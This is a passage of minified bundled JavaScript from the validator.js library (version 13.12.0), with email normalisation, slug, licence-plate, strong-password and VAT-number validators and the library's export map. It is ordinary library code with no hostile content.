        e.default = h;
        var t = o(wo());
        function o(p) {
            return p && p.__esModule ? p : {
                default: p
            }
        }
        var i = {
            all_lowercase: !0,
            gmail_lowercase: !0,
            gmail_remove_dots: !0,
            gmail_remove_subaddress: !0,
            gmail_convert_googlemaildotcom: !0,
            outlookdotcom_lowercase: !0,
            outlookdotcom_remove_subaddress: !0,
            yahoo_lowercase: !0,
            yahoo_remove_subaddress: !0,
            yandex_lowercase: !0,
            icloud_lowercase: !0,
            icloud_remove_subaddress: !0
        }
          , n = ["icloud.com", "me.com"]
          , s = ["hotmail.at", "hotmail.be", "hotmail.ca", "hotmail.cl", "hotmail.co.il", "hotmail.co.nz", "hotmail.co.th", "hotmail.co.uk", "hotmail.com", "hotmail.com.ar", "hotmail.com.au", "hotmail.com.br", "hotmail.com.gr", "hotmail.com.mx", "hotmail.com.pe", "hotmail.com.tr", "hotmail.com.vn", "hotmail.cz", "hotmail.de", "hotmail.dk", "hotmail.es", "hotmail.fr", "hotmail.hu", "hotmail.id", "hotmail.ie", "hotmail.in", "hotmail.it", "hotmail.jp", "hotmail.kr", "hotmail.lv", "hotmail.my", "hotmail.ph", "hotmail.pt", "hotmail.sa", "hotmail.sg", "hotmail.sk", "live.be", "live.co.uk", "live.com", "live.com.ar", "live.com.mx", "live.de", "live.es", "live.eu", "live.fr", "live.it", "live.nl", "msn.com", "outlook.at", "outlook.be", "outlook.cl", "outlook.co.il", "outlook.co.nz", "outlook.co.th", "outlook.com", "outlook.com.ar", "outlook.com.au", "outlook.com.br", "outlook.com.gr", "outlook.com.pe", "outlook.com.tr", "outlook.com.vn", "outlook.cz", "outlook.de", "outlook.dk", "outlook.es", "outlook.fr", "outlook.hu", "outlook.id", "outlook.ie", "outlook.in", "outlook.it", "outlook.jp", "outlook.kr", "outlook.lv", "outlook.my", "outlook.ph", "outlook.pt", "outlook.sa", "outlook.sg", "outlook.sk", "passport.com"]
          , a = ["rocketmail.com", "yahoo.ca", "yahoo.co.uk", "yahoo.com", "yahoo.de", "yahoo.fr", "yahoo.in", "yahoo.it", "ymail.com"]
          , l = ["yandex.ru", "yandex.ua", "yandex.kz", "yandex.com", "yandex.by", "ya.ru"];
        function f(p) {
            return p.length > 1 ? p : ""
        }
        function h(p, b) {
            b = (0,
            t.default)(b, i);
            var v = p.split("@")
              , T = v.pop()
              , x = v.join("@")
              , E = [x, T];
            if (E[1] = E[1].toLowerCase(),
            E[1] === "gmail.com" || E[1] === "googlemail.com") {
                if (b.gmail_remove_subaddress && (E[0] = E[0].split("+")[0]),
                b.gmail_remove_dots && (E[0] = E[0].replace(/\.+/g, f)),
                !E[0].length)
                    return !1;
                (b.all_lowercase || b.gmail_lowercase) && (E[0] = E[0].toLowerCase()),
                E[1] = b.gmail_convert_googlemaildotcom ? "gmail.com" : E[1]
            } else if (n.indexOf(E[1]) >= 0) {
                if (b.icloud_remove_subaddress && (E[0] = E[0].split("+")[0]),
                !E[0].length)
                    return !1;
                (b.all_lowercase || b.icloud_lowercase) && (E[0] = E[0].toLowerCase())
            } else if (s.indexOf(E[1]) >= 0) {
                if (b.outlookdotcom_remove_subaddress && (E[0] = E[0].split("+")[0]),
                !E[0].length)
                    return !1;
                (b.all_lowercase || b.outlookdotcom_lowercase) && (E[0] = E[0].toLowerCase())
            } else if (a.indexOf(E[1]) >= 0) {
                if (b.yahoo_remove_subaddress) {
                    var B = E[0].split("-");
                    E[0] = B.length > 1 ? B.slice(0, -1).join("-") : B[0]
                }
                if (!E[0].length)
                    return !1;
                (b.all_lowercase || b.yahoo_lowercase) && (E[0] = E[0].toLowerCase())
            } else
                l.indexOf(E[1]) >= 0 ? ((b.all_lowercase || b.yandex_lowercase) && (E[0] = E[0].toLowerCase()),
                E[1] = "yandex.ru") : b.all_lowercase && (E[0] = E[0].toLowerCase());
            return E.join("@")
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Qb, Qb.exports)),
    Qb.exports
}
var em = {
    exports: {}
}, ZO;
function aue() {
    return ZO || (ZO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = n;
        var t = o(Ve());
        function o(s) {
            return s && s.__esModule ? s : {
                default: s
            }
        }
        var i = /^[^\s-_](?!.*?[-_]{2,})[a-z0-9-\\][^\s]*[^-_\s]$/;
        function n(s) {
            return (0,
            t.default)(s),
            i.test(s)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(em, em.exports)),
    em.exports
}
var tm = {
    exports: {}
}, YO;
function cue() {
    return YO || (YO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = n;
        var t = o(Ve());
        function o(s) {
            return s && s.__esModule ? s : {
                default: s
            }
        }
        var i = {
            "cs-CZ": function(a) {
                return /^(([ABCDEFHIJKLMNPRSTUVXYZ]|[0-9])-?){5,8}$/.test(a)
            },
            "de-DE": function(a) {
                return /^((A|AA|AB|AC|AE|AH|AK|AM|AN|A|AP|AS|AT|AU|AW|AZ|B|BA|BB|BC|BE|BF|BH|BI|BK|BL|BM|BN|BO|B|BS|BT|BZ|C|CA|CB|CE|CO|CR|CW|D|DA|DD|DE|DH|DI|DL|DM|DN|DO|DU|DW|DZ|E|EA|EB|ED|EE|EF|EG|EH|EI|EL|EM|EN|ER|ES|EU|EW|F|FB|FD|FF|FG|FI|FL|FN|FO|FR|FS|FT|F|FW|FZ|G|GA|GC|GD|GE|GF|GG|GI|GK|GL|GM|GN|G|GP|GR|GS|GT|G|GV|GW|GZ|H|HA|HB|HC|HD|HE|HF|HG|HH|HI|HK|HL|HM|HN|HO|HP|HR|HS|HU|HV|HX|HY|HZ|IK|IL|IN|IZ|J|JE|JL|K|KA|KB|KC|KE|KF|KG|KH|KI|KK|KL|KM|KN|KO|KR|KS|KT|KU|KW|KY|L|LA|LB|LC|LD|LF|LG|LH|LI|LL|LM|LN|L|LP|LR|LU|M|MA|MB|MC|MD|ME|MG|MH|MI|MK|ML|MM|MN|MO|MQ|MR|MS|M|MW|MY|MZ|N|NB|ND|NE|NF|NH|NI|NK|NM|N|NP|NR|NT|NU|NW|NY|NZ|OA|OB|OC|OD|OE|OF|OG|OH|OK|OL|OP|OS|OZ|P|PA|PB|PE|PF|PI|PL|PM|PN|PR|PS|PW|PZ|R|RA|RC|RD|RE|RG|RH|RI|RL|RM|RN|RO|RP|RS|RT|RU|RV|RW|RZ|S|SB|SC|SE|SG|SI|SK|SL|SM|SN|SO|SP|SR|ST|SU|SW|SY|SZ|TE|TF|TG|TO|TP|TR|TS|TT|T|B|UE|UH|UL|UM|UN|V|VB|VG|VK|VR|VS|W|WA|WB|WE|WF|WI|WK|WL|WM|WN|WO|WR|WS|WT|W|WW|WZ|Z|ZE|ZI|ZP|ZR|ZW|ZZ)[- ]?[A-Z]{1,2}[- ]?\d{1,4}|(ABG|ABI|AIB|AIC|ALF|ALZ|ANA|ANG|ANK|APD|ARN|ART|ASL|ASZ|AUR|AZE|BAD|BAR|BBG|BCH|BED|BER|BGD|BGL|BID|BIN|BIR|BIT|BIW|BKS|BLB|BLK|BNA|BOG|BOH|BOR|BOT|BRA|BRB|BRG|BRK|BRL|BRV|BSB|BSK|BTF|BD|BUL|BR|BS|BZ|CAS|CHA|CLP|CLZ|COC|COE|CUX|DAH|DAN|DAU|DBR|DEG|DEL|DGF|DIL|DIN|DIZ|DKB|DLG|DON|DUD|DW|EBE|EBN|EBS|ECK|EIC|EIL|EIN|EIS|EMD|EMS|ERB|ERH|ERK|ERZ|ESB|ESW|FDB|FDS|FEU|FFB|FKB|FL|FOR|FRG|FRI|FRW|FTL|FS|GAN|GAP|GDB|GEL|GEO|GER|GHA|GHC|GLA|GMN|GNT|GOA|GOH|GRA|GRH|GRI|GRM|GRZ|GTH|GUB|GUN|GVM|HAB|HAL|HAM|HAS|HBN|HBS|HCH|HDH|HDL|HEB|HEF|HEI|HER|HET|HGN|HGW|HHM|HIG|HIP|HM|HOG|HOH|HOL|HOM|HOR|HS|HOT|HRO|HSK|HST|HVL|HWI|IGB|ILL|JL|KEH|KEL|KEM|KIB|KLE|KLZ|KN|KT|KZ|KRU|KN|KUS|KYF|LAN|LAU|LBS|LBZ|LDK|LDS|LEO|LER|LEV|LIB|LIF|LIP|LB|LOS|LRO|LSZ|LN|LUP|LWL|MAB|MAI|MAK|MAL|MED|MEG|MEI|MEK|MEL|MER|MET|MGH|MGN|MHL|MIL|MKK|MOD|MOL|MON|MOS|MSE|MSH|MSP|MST|MTK|MTL|MB|MR|MYK|MZG|NAB|NAI|NAU|NDH|NEA|NEB|NEC|NEN|NES|NEW|NMB|NMS|NOH|NOL|NOM|NOR|NVP|NWM|OAL|OBB|OBG|OCH|OHA|HR|OHV|OHZ|OPR|OSL|OVI|OVL|OVP|PAF|PAN|PAR|PCH|PEG|PIR|PL|PR|QFT|QLB|RDG|REG|REH|REI|RID|RIE|ROD|ROF|ROK|ROL|ROS|ROT|ROW|RSL|RD|RG|SAB|SAD|SAN|SAW|SBG|SBK|SCZ|SDH|SDL|SDT|SEB|SEE|SEF|SEL|SFB|SFT|SGH|SHA|SHG|SHK|SHL|SIG|SIM|SLE|SLF|SLK|SLN|SLS|SL|SLZ|SM|SOB|SOG|SOK|SM|SON|SPB|SPN|SRB|SRO|STA|STB|STD|STE|STL|SUL|SW|SWA|SZB|TBB|TDO|TET|TIR|TL|TUT|UEM|UER|UFF|USI|VAI|VEC|VER|VIB|VIE|VIT|VOH|WAF|WAK|WAN|WAR|WAT|WBS|WDA|WEL|WEN|WER|WES|WHV|WIL|WIS|WIT|WIZ|WLG|WMS|WND|WOB|WOH|WOL|WOR|WOS|WRN|WSF|WST|WSW|WTL|WTM|WUG|WM|WUN|WUR|WZL|ZEL|ZIG)[- ]?(([A-Z][- ]?\d{1,4})|([A-Z]{2}[- ]?\d{1,3})))[- ]?(E|H)?$/.test(a)
            },
            "de-LI": function(a) {
                return /^FL[- ]?\d{1,5}[UZ]?$/.test(a)
            },
            "en-IN": function(a) {
                return /^[A-Z]{2}[ -]?[0-9]{1,2}(?:[ -]?[A-Z])(?:[ -]?[A-Z]*)?[ -]?[0-9]{4}$/.test(a)
            },
            "es-AR": function(a) {
                return /^(([A-Z]{2} ?[0-9]{3} ?[A-Z]{2})|([A-Z]{3} ?[0-9]{3}))$/.test(a)
            },
            "fi-FI": function(a) {
                return /^(?=.{4,7})(([A-Z]{1,3}|[0-9]{1,3})[\s-]?([A-Z]{1,3}|[0-9]{1,5}))$/.test(a)
            },
            "hu-HU": function(a) {
                return /^((((?!AAA)(([A-NPRSTVZWXY]{1})([A-PR-Z]{1})([A-HJ-NPR-Z]))|(A[ABC]I)|A[ABC]O|A[A-W]Q|BPI|BPO|UCO|UDO|XAO)-(?!000)\d{3})|(M\d{6})|((CK|DT|CD|HC|H[ABEFIKLMNPRSTVX]|MA|OT|R[A-Z]) \d{2}-\d{2})|(CD \d{3}-\d{3})|(C-(C|X) \d{4})|(X-(A|B|C) \d{4})|(([EPVZ]-\d{5}))|(S A[A-Z]{2} \d{2})|(SP \d{2}-\d{2}))$/.test(a)
            },
            "pt-BR": function(a) {
                return /^[A-Z]{3}[ -]?[0-9][A-Z][0-9]{2}|[A-Z]{3}[ -]?[0-9]{4}$/.test(a)
            },
            "pt-PT": function(a) {
                return /^([A-Z]{2}|[0-9]{2})[ -]?([A-Z]{2}|[0-9]{2})[ -]?([A-Z]{2}|[0-9]{2})$/.test(a)
            },
            "sq-AL": function(a) {
                return /^[A-Z]{2}[- ]?((\d{3}[- ]?(([A-Z]{2})|T))|(R[- ]?\d{3}))$/.test(a)
            },
            "sv-SE": function(a) {
                return /^[A-HJ-PR-UW-Z]{3} ?[\d]{2}[A-HJ-PR-UW-Z1-9]$|(^[A-Z ]{2,7}$)/.test(a.trim())
            },
            "en-PK": function(a) {
                return /(^[A-Z]{2}((\s|-){0,1})[0-9]{3,4}((\s|-)[0-9]{2}){0,1}$)|(^[A-Z]{3}((\s|-){0,1})[0-9]{3,4}((\s|-)[0-9]{2}){0,1}$)|(^[A-Z]{4}((\s|-){0,1})[0-9]{3,4}((\s|-)[0-9]{2}){0,1}$)|(^[A-Z]((\s|-){0,1})[0-9]{4}((\s|-)[0-9]{2}){0,1}$)/.test(a.trim())
            }
        };
        function n(s, a) {
            if ((0,
            t.default)(s),
            a in i)
                return i[a](s);
            if (a === "any") {
                for (var l in i) {
                    var f = i[l];
                    if (f(s))
                        return !0
                }
                return !1
            }
            throw new Error("Invalid locale '".concat(a, "'"))
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(tm, tm.exports)),
    tm.exports
}
var rm = {
    exports: {}
}, XO;
function lue() {
    return XO || (XO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = v;
        var t = i(wo())
          , o = i(Ve());
        function i(T) {
            return T && T.__esModule ? T : {
                default: T
            }
        }
        var n = /^[A-Z]$/
          , s = /^[a-z]$/
          , a = /^[0-9]$/
          , l = /^[-#!$@%^&*()_+|~=`{}\[\]:";'<>?,.\/\\ ]$/
          , f = {
            minLength: 8,
            minLowercase: 1,
            minUppercase: 1,
            minNumbers: 1,
            minSymbols: 1,
            returnScore: !1,
            pointsPerUnique: 1,
            pointsPerRepeat: .5,
            pointsForContainingLower: 10,
            pointsForContainingUpper: 10,
            pointsForContainingNumber: 10,
            pointsForContainingSymbol: 10
        };
        function h(T) {
            var x = {};
            return Array.from(T).forEach(function(E) {
                var B = x[E];
                B ? x[E] += 1 : x[E] = 1
            }),
            x
        }
        function p(T) {
            var x = h(T)
              , E = {
                length: T.length,
                uniqueChars: Object.keys(x).length,
                uppercaseCount: 0,
                lowercaseCount: 0,
                numberCount: 0,
                symbolCount: 0
            };
            return Object.keys(x).forEach(function(B) {
                n.test(B) ? E.uppercaseCount += x[B] : s.test(B) ? E.lowercaseCount += x[B] : a.test(B) ? E.numberCount += x[B] : l.test(B) && (E.symbolCount += x[B])
            }),
            E
        }
        function b(T, x) {
            var E = 0;
            return E += T.uniqueChars * x.pointsPerUnique,
            E += (T.length - T.uniqueChars) * x.pointsPerRepeat,
            T.lowercaseCount > 0 && (E += x.pointsForContainingLower),
            T.uppercaseCount > 0 && (E += x.pointsForContainingUpper),
            T.numberCount > 0 && (E += x.pointsForContainingNumber),
            T.symbolCount > 0 && (E += x.pointsForContainingSymbol),
            E
        }
        function v(T) {
            var x = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : null;
            (0,
            o.default)(T);
            var E = p(T);
            return x = (0,
            t.default)(x || {}, f),
            x.returnScore ? b(E, x) : E.length >= x.minLength && E.lowercaseCount >= x.minLowercase && E.uppercaseCount >= x.minUppercase && E.numberCount >= x.minNumbers && E.symbolCount >= x.minSymbols
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(rm, rm.exports)),
    rm.exports
}
var Wf = {}, JO;
function uue() {
    if (JO)
        return Wf;
    JO = 1;
    function r(p) {
        "@babel/helpers - typeof";
        return r = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(b) {
            return typeof b
        }
        : function(b) {
            return b && typeof Symbol == "function" && b.constructor === Symbol && b !== Symbol.prototype ? "symbol" : typeof b
        }
        ,
        r(p)
    }
    Object.defineProperty(Wf, "__esModule", {
        value: !0
    }),
    Wf.default = h,
    Wf.vatMatchers = void 0;
    var e = n(Ve())
      , t = i(zD());
    function o(p) {
        if (typeof WeakMap != "function")
            return null;
        var b = new WeakMap
          , v = new WeakMap;
        return (o = function(x) {
            return x ? v : b
        }
        )(p)
    }
    function i(p, b) {
        if (p && p.__esModule)
            return p;
        if (p === null || r(p) != "object" && typeof p != "function")
            return {
                default: p
            };
        var v = o(b);
        if (v && v.has(p))
            return v.get(p);
        var T = {
            __proto__: null
        }
          , x = Object.defineProperty && Object.getOwnPropertyDescriptor;
        for (var E in p)
            if (E !== "default" && {}.hasOwnProperty.call(p, E)) {
                var B = x ? Object.getOwnPropertyDescriptor(p, E) : null;
                B && (B.get || B.set) ? Object.defineProperty(T, E, B) : T[E] = p[E]
            }
        return T.default = p,
        v && v.set(p, T),
        T
    }
    function n(p) {
        return p && p.__esModule ? p : {
            default: p
        }
    }
    var s = function(b) {
        var v = b.match(/^(AU)?(\d{11})$/);
        if (!v)
            return !1;
        var T = [10, 1, 3, 5, 7, 9, 11, 13, 15, 17, 19];
        b = b.replace(/^AU/, "");
        for (var x = (parseInt(b.slice(0, 1), 10) - 1).toString() + b.slice(1), E = 0, B = 0; B < 11; B++)
            E += T[B] * x.charAt(B);
        return E !== 0 && E % 89 === 0
    }
      , a = function(b) {
        var v = function(x) {
            var E = x.pop()
              , B = [5, 4, 3, 2, 7, 6, 5, 4]
              , P = (11 - x.reduce(function(O, F, D) {
                return O + F * B[D]
            }, 0) % 11) % 11;
            return E === P
        };
        return /^(CHE[- ]?)?(\d{9}|(\d{3}\.\d{3}\.\d{3})|(\d{3} \d{3} \d{3})) ?(TVA|MWST|IVA)?$/.test(b) && v(b.match(/\d/g).map(function(T) {
            return +T
        }))
    }
      , l = function(b) {
        var v = b.match(/^(PT)?(\d{9})$/);
        if (!v)
            return !1;
        var T = v[2]
          , x = 11 - t.reverseMultiplyAndSum(T.split("").slice(0, 8).map(function(E) {
            return parseInt(E, 10)
        }), 9) % 11;
        return x > 9 ? parseInt(T[8], 10) === 0 : x === parseInt(T[8], 10)
    }
      , f = Wf.vatMatchers = {
        AT: function(b) {
            return /^(AT)?U\d{8}$/.test(b)
        },
        BE: function(b) {
            return /^(BE)?\d{10}$/.test(b)
        },
        BG: function(b) {
            return /^(BG)?\d{9,10}$/.test(b)
        },
        HR: function(b) {
            return /^(HR)?\d{11}$/.test(b)
        },
        CY: function(b) {
            return /^(CY)?\w{9}$/.test(b)
        },
        CZ: function(b) {
            return /^(CZ)?\d{8,10}$/.test(b)
        },
        DK: function(b) {
            return /^(DK)?\d{8}$/.test(b)
        },
        EE: function(b) {
            return /^(EE)?\d{9}$/.test(b)
        },
        FI: function(b) {
            return /^(FI)?\d{8}$/.test(b)
        },
        FR: function(b) {
            return /^(FR)?\w{2}\d{9}$/.test(b)
        },
        DE: function(b) {
            return /^(DE)?\d{9}$/.test(b)
        },
        EL: function(b) {
            return /^(EL)?\d{9}$/.test(b)
        },
        HU: function(b) {
            return /^(HU)?\d{8}$/.test(b)
        },
        IE: function(b) {
            return /^(IE)?\d{7}\w{1}(W)?$/.test(b)
        },
        IT: function(b) {
            return /^(IT)?\d{11}$/.test(b)
        },
        LV: function(b) {
            return /^(LV)?\d{11}$/.test(b)
        },
        LT: function(b) {
            return /^(LT)?\d{9,12}$/.test(b)
        },
        LU: function(b) {
            return /^(LU)?\d{8}$/.test(b)
        },
        MT: function(b) {
            return /^(MT)?\d{8}$/.test(b)
        },
        NL: function(b) {
            return /^(NL)?\d{9}B\d{2}$/.test(b)
        },
        PL: function(b) {
            return /^(PL)?(\d{10}|(\d{3}-\d{3}-\d{2}-\d{2})|(\d{3}-\d{2}-\d{2}-\d{3}))$/.test(b)
        },
        PT: l,
        RO: function(b) {
            return /^(RO)?\d{2,10}$/.test(b)
        },
        SK: function(b) {
            return /^(SK)?\d{10}$/.test(b)
        },
        SI: function(b) {
            return /^(SI)?\d{8}$/.test(b)
        },
        ES: function(b) {
            return /^(ES)?\w\d{7}[A-Z]$/.test(b)
        },
        SE: function(b) {
            return /^(SE)?\d{12}$/.test(b)
        },
        AL: function(b) {
            return /^(AL)?\w{9}[A-Z]$/.test(b)
        },
        MK: function(b) {
            return /^(MK)?\d{13}$/.test(b)
        },
        AU: s,
        BY: function(b) {
            return /^( )?\d{9}$/.test(b)
        },
        CA: function(b) {
            return /^(CA)?\d{9}$/.test(b)
        },
        IS: function(b) {
            return /^(IS)?\d{5,6}$/.test(b)
        },
        IN: function(b) {
            return /^(IN)?\d{15}$/.test(b)
        },
        ID: function(b) {
            return /^(ID)?(\d{15}|(\d{2}.\d{3}.\d{3}.\d{1}-\d{3}.\d{3}))$/.test(b)
        },
        IL: function(b) {
            return /^(IL)?\d{9}$/.test(b)
        },
        KZ: function(b) {
            return /^(KZ)?\d{12}$/.test(b)
        },
        NZ: function(b) {
            return /^(NZ)?\d{9}$/.test(b)
        },
        NG: function(b) {
            return /^(NG)?(\d{12}|(\d{8}-\d{4}))$/.test(b)
        },
        NO: function(b) {
            return /^(NO)?\d{9}MVA$/.test(b)
        },
        PH: function(b) {
            return /^(PH)?(\d{12}|\d{3} \d{3} \d{3} \d{3})$/.test(b)
        },
        RU: function(b) {
            return /^(RU)?(\d{10}|\d{12})$/.test(b)
        },
        SM: function(b) {
            return /^(SM)?\d{5}$/.test(b)
        },
        SA: function(b) {
            return /^(SA)?\d{15}$/.test(b)
        },
        RS: function(b) {
            return /^(RS)?\d{9}$/.test(b)
        },
        CH: a,
        TR: function(b) {
            return /^(TR)?\d{10}$/.test(b)
        },
        UA: function(b) {
            return /^(UA)?\d{12}$/.test(b)
        },
        GB: function(b) {
            return /^GB((\d{3} \d{4} ([0-8][0-9]|9[0-6]))|(\d{9} \d{3})|(((GD[0-4])|(HA[5-9]))[0-9]{2}))$/.test(b)
        },
        UZ: function(b) {
            return /^(UZ)?\d{9}$/.test(b)
        },
        AR: function(b) {
            return /^(AR)?\d{11}$/.test(b)
        },
        BO: function(b) {
            return /^(BO)?\d{7}$/.test(b)
        },
        BR: function(b) {
            return /^(BR)?((\d{2}.\d{3}.\d{3}\/\d{4}-\d{2})|(\d{3}.\d{3}.\d{3}-\d{2}))$/.test(b)
        },
        CL: function(b) {
            return /^(CL)?\d{8}-\d{1}$/.test(b)
        },
        CO: function(b) {
            return /^(CO)?\d{10}$/.test(b)
        },
        CR: function(b) {
            return /^(CR)?\d{9,12}$/.test(b)
        },
        EC: function(b) {
            return /^(EC)?\d{13}$/.test(b)
        },
        SV: function(b) {
            return /^(SV)?\d{4}-\d{6}-\d{3}-\d{1}$/.test(b)
        },
        GT: function(b) {
            return /^(GT)?\d{7}-\d{1}$/.test(b)
        },
        HN: function(b) {
            return /^(HN)?$/.test(b)
        },
        MX: function(b) {
            return /^(MX)?\w{3,4}\d{6}\w{3}$/.test(b)
        },
        NI: function(b) {
            return /^(NI)?\d{3}-\d{6}-\d{4}\w{1}$/.test(b)
        },
        PA: function(b) {
            return /^(PA)?$/.test(b)
        },
        PY: function(b) {
            return /^(PY)?\d{6,8}-\d{1}$/.test(b)
        },
        PE: function(b) {
            return /^(PE)?\d{11}$/.test(b)
        },
        DO: function(b) {
            return /^(DO)?(\d{11}|(\d{3}-\d{7}-\d{1})|[1,4,5]{1}\d{8}|([1,4,5]{1})-\d{2}-\d{5}-\d{1})$/.test(b)
        },
        UY: function(b) {
            return /^(UY)?\d{12}$/.test(b)
        },
        VE: function(b) {
            return /^(VE)?[J,G,V,E]{1}-(\d{9}|(\d{8}-\d{1}))$/.test(b)
        }
    };
    function h(p, b) {
        if ((0,
        e.default)(p),
        (0,
        e.default)(b),
        b in f)
            return f[b](p);
        throw new Error("Invalid country code: '".concat(b, "'"))
    }
    return Wf
}
var QO;
function fue() {
    return QO || (QO = 1,
    function(r, e) {
        function t(Pt) {
            "@babel/helpers - typeof";
            return t = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(Gt) {
                return typeof Gt
            }
            : function(Gt) {
                return Gt && typeof Symbol == "function" && Gt.constructor === Symbol && Gt !== Symbol.prototype ? "symbol" : typeof Gt
            }
            ,
            t(Pt)
        }
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = void 0;
        var o = Le(q3())
          , i = Le(OD())
          , n = Le(Fce())
          , s = Le(Uce())
          , a = Le(kce())
          , l = Le(Lce())
          , f = Le($ce())
          , h = Le(MD())
          , p = Le(zce())
          , b = Le(jce())
          , v = Le(z1())
          , T = Le(qce())
          , x = Le(V3())
          , E = Le(ND())
          , B = Le(Vce())
          , P = Le(Hce())
          , O = Le(Gce())
          , F = Le(Kce())
          , D = Lt(Zce())
          , I = Lt(Yce())
          , M = Le(Xce())
          , C = Le(Jce())
          , W = Le(Qce())
          , k = Le(ele())
          , H = Le(tle())
          , X = Le(rle())
          , Y = Le(nle())
          , V = Le(DD())
          , R = Le(FD())
          , _ = Le(ole())
          , $ = Le(ile())
          , z = Le(ale())
          , K = Le(cle())
          , j = Le(H3())
          , ee = Lt(ID())
          , ie = Le(ule())
          , ae = Le(UD())
          , he = Le(fle())
          , me = Le(dle())
          , Pe = Le(hle())
          , _e = Le(ple())
          , Fe = Le(gle())
          , Je = Le(yle())
          , rt = Lt(ble())
          , xt = Le(mle())
          , Tt = Le(xle())
          , Qe = Le(wle())
          , Ye = Le(vle())
          , Bt = Le(Tle())
          , Dr = Le(Ele())
          , Cr = Le(Ale())
          , se = Le(WD())
          , le = Le(Ple())
          , Te = Le(Cle())
          , Ue = Le(Sle())
          , Re = Le(Ble())
          , $e = Le(_le())
          , st = Le($D())
          , yt = Le(Ile())
          , vt = Le(Ole())
          , Z = Le(Rle())
          , N = Le(Wle())
          , U = Le(Mle())
          , ne = Le(Nle())
          , J = Le(Dle())
          , Ee = Lt(Fle())
          , Ie = Le(Ule())
          , re = Le(kle())
          , Nt = Le(Lle())
          , Yt = $le()
          , wt = Le(zle())
          , zt = Le(jle())
          , zi = Le(qle())
          , Ke = Le(kD())
          , jo = Le(Vle())
          , oo = Le(Hle())
          , ji = Le(Gle())
          , di = Le(Kle())
          , jr = Le(LD())
          , bs = Le(Zle())
          , ms = Le(Yle())
          , fe = Le(Xle())
          , ye = Le(Jle())
          , Ce = Le(Qle())
          , Ne = Lt(eue())
          , je = Le(qD())
          , nt = Le(jD())
          , At = Le(VD())
          , ot = Le(tue())
          , bt = Le(rue())
          , mt = Le(nue())
          , Ct = Le(oue())
          , lt = Le(HD())
          , St = Le(iue())
          , Vt = Le(sue())
          , Ht = Le(aue())
          , De = Le(cue())
          , Ge = Le(lue())
          , kt = Le(uue());
        function mn(Pt) {
            if (typeof WeakMap != "function")
                return null;
            var Gt = new WeakMap
              , it = new WeakMap;
            return (mn = function(Wt) {
                return Wt ? it : Gt
            }
            )(Pt)
        }
        function Lt(Pt, Gt) {
            if (Pt && Pt.__esModule)
                return Pt;
            if (Pt === null || t(Pt) != "object" && typeof Pt != "function")
                return {
                    default: Pt
                };
            var it = mn(Gt);
            if (it && it.has(Pt))
                return it.get(Pt);
            var sn = {
                __proto__: null
            }
              , Wt = Object.defineProperty && Object.getOwnPropertyDescriptor;
            for (var y in Pt)
                if (y !== "default" && {}.hasOwnProperty.call(Pt, y)) {
                    var m = Wt ? Object.getOwnPropertyDescriptor(Pt, y) : null;
                    m && (m.get || m.set) ? Object.defineProperty(sn, y, m) : sn[y] = Pt[y]
                }
            return sn.default = Pt,
            it && it.set(Pt, sn),
            sn
        }
        function Le(Pt) {
            return Pt && Pt.__esModule ? Pt : {
                default: Pt
            }
        }
        var te = "13.12.0"
          , qo = {
            version: te,
            toDate: o.default,
            toFloat: i.default,
            toInt: n.default,
            toBoolean: s.default,
            equals: a.default,
            contains: l.default,
            matches: f.default,
            isEmail: h.default,
            isURL: p.default,
            isMACAddress: b.default,
            isIP: v.default,
            isIPRange: T.default,
            isFQDN: x.default,
            isBoolean: P.default,
            isIBAN: rt.default,
            isBIC: xt.default,
            isAbaRouting: F.default,
            isAlpha: D.default,
            isAlphaLocales: D.locales,
            isAlphanumeric: I.default,
            isAlphanumericLocales: I.locales,
            isNumeric: M.default,
            isPassportNumber: C.default,
            isPort: W.default,
            isLowercase: k.default,
            isUppercase: H.default,
            isAscii: Y.default,
            isFullWidth: V.default,
            isHalfWidth: R.default,
            isVariableWidth: _.default,
            isMultibyte: $.default,
            isSemVer: z.default,
            isSurrogatePair: K.default,
            isInt: j.default,
            isIMEI: X.default,
            isFloat: ee.default,
            isFloatLocales: ee.locales,
            isDecimal: ie.default,
            isHexadecimal: ae.default,
            isOctal: he.default,
            isDivisibleBy: me.default,
            isHexColor: Pe.default,
            isRgbColor: _e.default,
            isHSL: Fe.default,
            isISRC: Je.default,
            isMD5: Tt.default,
            isHash: Qe.default,
            isJWT: Ye.default,
            isJSON: Bt.default,
            isEmpty: Dr.default,
            isLength: Cr.default,
            isLocale: O.default,
            isByteLength: se.default,
            isUUID: le.default,
            isMongoId: Te.default,
            isAfter: Ue.default,
            isBefore: Re.default,
            isIn: $e.default,
            isLuhnNumber: st.default,
            isCreditCard: yt.default,
            isIdentityCard: vt.default,
            isEAN: Z.default,
            isISIN: N.default,
            isISBN: U.default,
            isISSN: ne.default,
            isMobilePhone: Ee.default,
            isMobilePhoneLocales: Ee.locales,
            isPostalCode: Ne.default,
            isPostalCodeLocales: Ne.locales,
            isEthereumAddress: Ie.default,
            isCurrency: re.default,
            isBtcAddress: Nt.default,
            isISO6346: Yt.isISO6346,
            isFreightContainerID: Yt.isFreightContainerID,
            isISO6391: wt.default,
            isISO8601: zt.default,
            isRFC3339: zi.default,
            isISO31661Alpha2: Ke.default,
            isISO31661Alpha3: jo.default,
            isISO4217: oo.default,
            isBase32: ji.default,
            isBase58: di.default,
            isBase64: jr.default,
            isDataURI: bs.default,
            isMagnetURI: ms.default,
            isMailtoURI: fe.default,
            isMimeType: ye.default,
            isLatLong: Ce.default,
            ltrim: je.default,
            rtrim: nt.default,
            trim: At.default,
            escape: ot.default,
            unescape: bt.default,
            stripLow: mt.default,
            whitelist: Ct.default,
            blacklist: lt.default,
            isWhitelisted: St.default,
            normalizeEmail: Vt.default,
            toString,
            isSlug: Ht.default,
            isStrongPassword: Ge.default,
            isTaxID: J.default,
            isDate: E.default,
            isTime: B.default,
            isLicensePlate: De.default,
            isVAT: kt.default,
            ibanLocales: rt.locales
        };
        e.default = qo,
        r.exports = e.default,
